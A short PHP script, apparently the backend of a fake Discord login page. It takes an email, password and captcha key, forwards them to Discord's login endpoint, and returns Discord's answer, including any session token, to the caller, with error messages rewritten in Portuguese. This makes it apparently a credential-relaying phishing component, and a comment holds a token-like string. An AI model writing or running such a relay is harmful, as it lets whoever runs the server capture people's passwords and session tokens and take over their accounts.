<?php
header('Content-Type: application/json');
$postdata = file_get_contents("php://input");
$obj = json_decode($postdata);
$email = $obj->{'email'};
$senha =$obj->{'password'};
$captcha_key = $obj->{'captcha_key'};
if(empty($email)){
	header("HTTP/1.1 400 Bad Request");
	echo '{"email": ["Este campo \u00e9 obrigat\u00f3rio"], "password": ["Este campo \u00e9 obrigat\u00f3rio"]}';
}
else{
	if(empty($email)){
		header("HTTP/1.1 400 Bad Request");
		echo '{"email": ["Este campo \u00e9 obrigat\u00f3rio"]}';
	}
	else if(empty($senha)){
		header("HTTP/1.1 400 Bad Request");
		echo '{"password": ["Este campo \u00e9 obrigat\u00f3rio"]}';
	}
	else if(isset($email) && isset($senha)){
		header("HTTP/1.1 200 OK");
		// $token = 'NDc3NTEwOTA3MTg3MDM2MTgw.DzsuAg.KB01HjRHEguGlUd8omq5JYxVjks';
		// echo '{"token": "' . $token . '"}';
		$data = array("email" => $email, "password" => $senha, "captcha_key" => $captcha_key);                                                                    
		$data_string = json_encode($data);                                                                                   
		$ch = curl_init('https://discordapp.com/api/v6/auth/login');                                                                     
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");                                                                     
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data_string);                                                                  
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);                                                                      
		curl_setopt($ch, CURLOPT_HTTPHEADER, array(                                                                          
		    'Content-Type: application/json',                                                                                
		    'Content-Length: ' . strlen($data_string))                                                                       
		);                                                                                                                   
		$answer  = curl_exec($ch);
		if($answer == '{"password": ["Password does not match."]}'){
			header("HTTP/1.1 400 Bad Request");
			echo '{"password": ["Senha incorreta!"]}';
		}
		else if($answer == '{"captcha_key": ["captcha-required"]}'){
			header("HTTP/1.1 400 Bad Request");
			echo '{"captcha_key": ["captcha-required"]}';
		}
		else{
		echo $answer;
		}
		if (curl_error($ch)) {
		    echo curl_error($ch);
		}
	}
}
?>